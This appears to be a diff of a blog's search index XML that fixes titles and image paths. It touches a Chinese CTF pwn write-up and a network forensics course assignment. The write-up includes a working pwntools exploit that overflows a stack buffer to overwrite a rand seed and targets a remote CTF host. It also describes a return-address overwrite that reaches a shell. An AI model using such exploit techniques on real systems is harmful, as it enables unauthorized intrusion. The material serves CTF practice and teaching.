@@ -312,10 +312,9 @@
       </tags>
   </entry>
   <entry>
-    <title></title>
-    <url>/posts/0/</url>
-    <content><![CDATA[<p>title: 攻防世界pwn进阶<br>abbrlink: 5600bec<br>date: 2020-11-23 09:09:48<br>tags: 攻防世界<br>categories: pwn</p>
-<h1 id="攻防世界——pwn进阶"><a href="#攻防世界——pwn进阶" class="headerlink" title="攻防世界——pwn进阶"></a>攻防世界——pwn进阶</h1><p>攻防世界的pwn进阶题目的记录</p>
+    <title>攻防世界pwn进阶</title>
+    <url>/posts/5600bec/</url>
+    <content><![CDATA[<h1 id="攻防世界——pwn进阶"><a href="#攻防世界——pwn进阶" class="headerlink" title="攻防世界——pwn进阶"></a>攻防世界——pwn进阶</h1><p>攻防世界的pwn进阶题目的记录</p>
 <a id="more"></a>
 
 <h2 id="三分题"><a href="#三分题" class="headerlink" title="三分题"></a>三分题</h2><h3 id="1-forgot"><a href="#1-forgot" class="headerlink" title="1. forgot"></a>1. forgot</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201220180827121.png" alt="image-20201220180827121"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201216091450390.png" alt="image-20201216091450390"></p>
@@ -536,12 +535,12 @@
 
 <p>结果：</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201209175028067.png" alt="image-20201209175028067"></p>
-<h3 id="11-反应釜开关控制"><a href="#11-反应釜开关控制" class="headerlink" title="11. 反应釜开关控制"></a>11. 反应釜开关控制</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211458145.png" alt="image-20210108211458145"><img src="/posts/0/image-20201123091430114.png" alt="image-20201123091430114"></p>
+<h3 id="11-反应釜开关控制"><a href="#11-反应釜开关控制" class="headerlink" title="11. 反应釜开关控制"></a>11. 反应釜开关控制</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211458145.png" alt="image-20210108211458145"><img src="/posts/5600bec/image-20201123091430114.png" alt="image-20201123091430114"></p>
 <p><strong>考察知识点：栈溢出</strong></p>
-<h4 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="/posts/0/image-20201123091242758.png" alt="image-20201123091242758"></p>
+<h4 id="代码分析-8"><a href="#代码分析-8" class="headerlink" title="代码分析"></a>代码分析</h4><p><img src="/posts/5600bec/image-20201123091242758.png" alt="image-20201123091242758"></p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123231711816.png" alt="image-20201123231711816"></p>
-<p><img src="/posts/0/image-20201123091319181.png" alt="image-20201123091319181"></p>
-<p><img src="/posts/0/image-20201123091712759.png" alt="image-20201123091712759"></p>
+<p><img src="/posts/5600bec/image-20201123091319181.png" alt="image-20201123091319181"></p>
+<p><img src="/posts/5600bec/image-20201123091712759.png" alt="image-20201123091712759"></p>
 <p>这道题感觉应该是不给附件中的可执行文件盲打才对，不然知道可执行文件用ida反编译，就知道是很就简单的栈溢出。通过三次栈溢出，覆盖返回地址跳转到后门函数。</p>
 <h4 id="思路及利用-8"><a href="#思路及利用-8" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>首先保护只有堆栈不可执行。同时是使用gets函数获取输入。那么就可以随意的进行栈溢出。那么思路就很简单了。先通过栈溢出覆盖返回地址，从main跳到easy，从easy跳到normal，从normal跳到shell。</p>
 <p>需要注意的是，ida显示的与rbp的距离有时候是不准确的，最好是通过gdb动态调试得到。这里为了方便，直接用来ida显示，成功得到shell。</p>
@@ -569,8 +568,8 @@
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201123094345375.png" alt="image-20201123094345375"></p>
 <p><strong>考察知识点：栈溢出修改随机数种子</strong></p>
 <h4 id="代码分析-10"><a href="#代码分析-10" class="headerlink" title="代码分析"></a>代码分析</h4><p>通过ida反编译阅读源码</p>
-<p><img src="/posts/0/image-20201123094603206.png" alt="image-20201123094603206"></p>
-<p><img src="/posts/0/image-20201123094616274.png" alt="image-20201123094616274"></p>
+<p><img src="/posts/5600bec/image-20201123094603206.png" alt="image-20201123094603206"></p>
+<p><img src="/posts/5600bec/image-20201123094616274.png" alt="image-20201123094616274"></p>
 <p>可以看出，这是一个骰子游戏。连续猜对50次就可以得到flag。</p>
 <p>通过分析栈可以知道，输入的name是可以覆盖掉seed的。</p>
 <h4 id="思路及利用-10"><a href="#思路及利用-10" class="headerlink" title="思路及利用"></a>思路及利用</h4><p>计算机的随机数都是伪随机数，种子一样时，rand函数会提供一样的数。所以需要控制seed的值。使用name覆盖seed。</p>
@@ -579,7 +578,7 @@
 <figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> ctypes <span class="keyword">import</span> *  <span class="comment"># 提供了与 C 兼容的数据类型，并允许调用 DLL 或共享库中的函数。</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># p = process(&quot;./dice_game&quot;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;220.249.52.133&#x27;</span>,<span class="number">59063</span>)</span><br><span class="line">libc = cdll.LoadLibrary(<span class="string">&quot;libc.so.6&quot;</span>)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;name:&quot;</span>)</span><br><span class="line"><span class="comment">#覆盖seed值为0</span></span><br><span class="line">name = <span class="string">b&#x27;a&#x27;</span>*<span class="number">0x40</span>+p64(<span class="number">0</span>)</span><br><span class="line">p.sendline(name)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">50</span>):</span><br><span class="line">    p.recvuntil(<span class="string">&quot;point(1~6): &quot;</span>)</span><br><span class="line">    <span class="comment">#混合编程，调用c的rand函数，rand的缺省时默认种子参数是0</span></span><br><span class="line">    p.sendline(<span class="built_in">str</span>(libc.rand()%<span class="number">6</span>+<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
 
 <p>运行结果如下：</p>
-<p><img src="/posts/0/image-20201123095347070.png" alt="image-20201123095347070"></p>
+<p><img src="/posts/5600bec/image-20201123095347070.png" alt="image-20201123095347070"></p>
 <h3 id="14-satck2"><a href="#14-satck2" class="headerlink" title="14. satck2"></a>14. satck2</h3><p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108211918463.png" alt="image-20210108211918463"><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20210108214014855.png" alt="image-20210108214014855"></p>
 <p><strong>考察知识点：数组越界</strong></p>
 <h4 id="代码分析-11"><a href="#代码分析-11" class="headerlink" title="代码分析"></a>代码分析</h4><p>整个程序实现了一个平均数计算，用户可以输入指定个数的数字计算平均值，其中数字打印、修改、添加。</p>
@@ -1091,6 +1090,12 @@
 
 
 ]]></content>
+      <categories>
+        <category>pwn</category>
+      </categories>
+      <tags>
+        <tag>攻防世界</tag>
+      </tags>
   </entry>
   <entry>
     <title>栈溢出基础</title>
@@ -1316,7 +1321,8 @@
   <entry>
     <title>网络安全课程作业</title>
     <url>/posts/e492a0d/</url>
-    <content><![CDATA[<a id="more"></a>
+    <content><![CDATA[<p>网络安全课程作业</p>
+<a id="more"></a>
 
 <h2 id="培养方案比较"><a href="#培养方案比较" class="headerlink" title="培养方案比较"></a>培养方案比较</h2><p>培养方案的获取主要通过各高校的学院官网获得。</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201214090506931.png" alt="image-20201214090506931"></p>
@@ -1480,7 +1486,7 @@
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212220532176.png" alt="image-20201212220532176"></p>
 <p>在附近，可以找到登录成功后显示的界面。</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212221215012.png" alt="image-20201212221215012"></p>
-<p>所以，确定攻击者得到了<code>lixiaofei@t3sec.com</code>的账户。同理可以知道<a href="mailto:&#x69;&#116;&#64;&#116;&#x33;&#115;&#101;&#x63;&#x2e;&#x63;&#x63;">&#x69;&#116;&#64;&#116;&#x33;&#115;&#101;&#x63;&#x2e;&#x63;&#x63;</a>已被窃取。</p>
+<p>所以，确定攻击者得到了<code>lixiaofei@t3sec.com</code>的账户。同理可以知道<a href="mailto:&#105;&#x74;&#x40;&#x74;&#51;&#x73;&#101;&#99;&#x2e;&#x63;&#x63;">&#105;&#x74;&#x40;&#x74;&#51;&#x73;&#101;&#99;&#x2e;&#x63;&#x63;</a>已被窃取。</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212222146833.png" alt="image-20201212222146833"></p>
 <p>继续筛选攻击者的攻击行为<code>ip.src == 111.206.82.164 &amp;&amp; http &amp;&amp; not(ip.dst == 172.16.61.206) &amp;&amp; not(ip.dst == 172.16.60.200)</code>。</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212222611338.png" alt="image-20201212222611338"></p>
@@ -1494,7 +1500,7 @@
 
 <p>接下是查看SMTP协议。</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212224125405.png" alt="image-20201212224125405"></p>
-<p>可以发现，主要有两个邮箱发送邮件。<a href="mailto:&#x78;&#x73;&#x73;&#x65;&#114;&#x40;&#108;&#105;&#x76;&#101;&#x2e;&#99;&#x6e;">&#x78;&#x73;&#x73;&#x65;&#114;&#x40;&#108;&#105;&#x76;&#101;&#x2e;&#99;&#x6e;</a>和clickjacking@163.com。</p>
+<p>可以发现，主要有两个邮箱发送邮件。<a href="mailto:&#120;&#x73;&#x73;&#x65;&#x72;&#64;&#x6c;&#x69;&#118;&#101;&#x2e;&#99;&#x6e;">&#120;&#x73;&#x73;&#x65;&#x72;&#64;&#x6c;&#x69;&#118;&#101;&#x2e;&#99;&#x6e;</a>和clickjacking@163.com。</p>
 <p>分别追踪tcp流</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212224338790.png" alt="image-20201212224338790"></p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212224909181.png" alt="image-20201212224909181"></p>
@@ -1505,7 +1511,7 @@
 <p>如果用户点击了钓鱼邮件中的链接的话，对于<code>172.16.60.195:80</code>请求头中肯定会携带<code>webmail</code>的<code>cookie</code>，过滤一下对<code>172.16.60.195:80</code>的请求。</p>
 <p><code>(ip.src == 111.206.82.164 &amp;&amp; http &amp;&amp; ip.dst == 172.16.60.195) || (ip.dst == 111.206.82.164 &amp;&amp; http &amp;&amp; ip.src == 172.16.60.195)</code>。</p>
 <p><img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212225432765.png" alt="image-20201212225432765"></p>
-<p>可以发现由session有<a href="mailto:&#108;&#105;&#120;&#x69;&#97;&#111;&#x66;&#101;&#x69;&#x40;&#116;&#51;&#x73;&#x65;&#x63;&#x2e;&#99;&#99;">&#108;&#105;&#120;&#x69;&#97;&#111;&#x66;&#101;&#x69;&#x40;&#116;&#51;&#x73;&#x65;&#x63;&#x2e;&#99;&#99;</a>，it@t3sec.cc。且 显示的源地址是<code>111.206.82.164</code>是攻击机，说明被劫持了。在途中的<code>POST</code>请求中的账号密码也被窃取<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212225710772.png" alt="image-20201212225710772"></p>
+<p>可以发现由session有<a href="mailto:&#x6c;&#x69;&#x78;&#x69;&#x61;&#x6f;&#x66;&#101;&#x69;&#x40;&#116;&#x33;&#x73;&#x65;&#x63;&#46;&#99;&#99;">&#x6c;&#x69;&#x78;&#x69;&#x61;&#x6f;&#x66;&#101;&#x69;&#x40;&#116;&#x33;&#x73;&#x65;&#x63;&#46;&#99;&#99;</a>，it@t3sec.cc。且 显示的源地址是<code>111.206.82.164</code>是攻击机，说明被劫持了。在途中的<code>POST</code>请求中的账号密码也被窃取<img src="https://lsh-picture.oss-cn-beijing.aliyuncs.com/img/image-20201212225710772.png" alt="image-20201212225710772"></p>
 <p>到这里，就可以回答问题了。</p>
 <ul>
 <li>黑客的攻击ip是多少，被攻击的内网IP是多少？</li>
